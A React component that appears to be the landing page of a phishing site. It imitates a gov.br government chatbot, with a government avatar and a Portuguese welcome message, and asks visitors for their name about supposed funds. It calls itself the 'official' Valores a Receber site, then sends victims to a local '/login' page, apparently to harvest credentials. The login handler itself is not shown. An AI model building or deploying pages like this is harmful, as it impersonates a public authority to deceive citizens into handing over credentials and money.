import React, { useState, useEffect } from 'react';
import styles from "./Home.module.scss";

const Home = () => {
  const [step, setStep] = useState(0); // controla o progresso
  const [name, setName] = useState("");
  const [submittedName, setSubmittedName] = useState("");
  const [isTyping, setIsTyping] = useState(false);

  useEffect(() => {
    if (step === 0) {
      // Depois de 2 segundos, mostra a segunda mensagem
      setIsTyping(true);
      const timer = setTimeout(() => {
        setStep(1);
        setIsTyping(false);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleNameSubmit = () => {
    if (name.trim() !== "") {
      setSubmittedName(name);
      setIsTyping(true);

      setTimeout(() => {
        setStep(2);
        setIsTyping(false);
      }, 1500);
    }
  };

  const handleVerifyClick = () => {
    window.location.href = "/login";
  };

  return (
    <div className={styles.home}>
      <div className={styles.chat}>

        {/* 1ª Mensagem imediata */}
        <div className={styles.botMessage}>
          <img src="/govbr.png" alt="Chatbot" className={styles.avatar} />
          <p>Bem-vindo(a) ao Portal de Atendimento!</p>
        </div>

        {/* 2ª Mensagem após delay */}
        {step >= 1 && (
          <div className={styles.botMessage}>
            <img src="/govbr.png" alt="Chatbot" className={styles.avatar} />
            <p>Para consultar seus <b>Fundos Associados</b> informe seu nome abaixo:</p>
          </div>
        )}

        {/* Digitando antes da 2ª mensagem */}
        {isTyping && (
          <div className={styles.botMessage}>
            <img src="/govbr.png" alt="Chatbot" className={styles.avatar} />
            <p className={styles.typing}><span></span><span></span><span></span></p>
          </div>
        )}

        {/* Input aparece só depois da segunda mensagem */}
        {step >= 1 && !isTyping && !submittedName && (
          <div className={styles.userInput}>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Digite seu nome"
            />
            <button onClick={handleNameSubmit}>Enviar</button>
          </div>
        )}

        {/* Nome digitado pelo usuário */}
        {submittedName && (
          <div className={styles.userMessage}>
            <p>{submittedName}</p>
          </div>
        )}

        {/* Última resposta do chatbot com botão */}
        {step === 2 && !isTyping && (
          <>
            <div className={styles.botMessage}>
              <img src="/govbr.png" alt="Chatbot" className={styles.avatar} />
              <p>Perfeito, Clique no botão abaixo para acessar o site Oficial de <b>Valores a Receber!</b></p>
            </div>
            <div className={styles.actionButton}>
              <button onClick={handleVerifyClick}>VERIFICAR VALORES A RECEBER</button>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default Home;
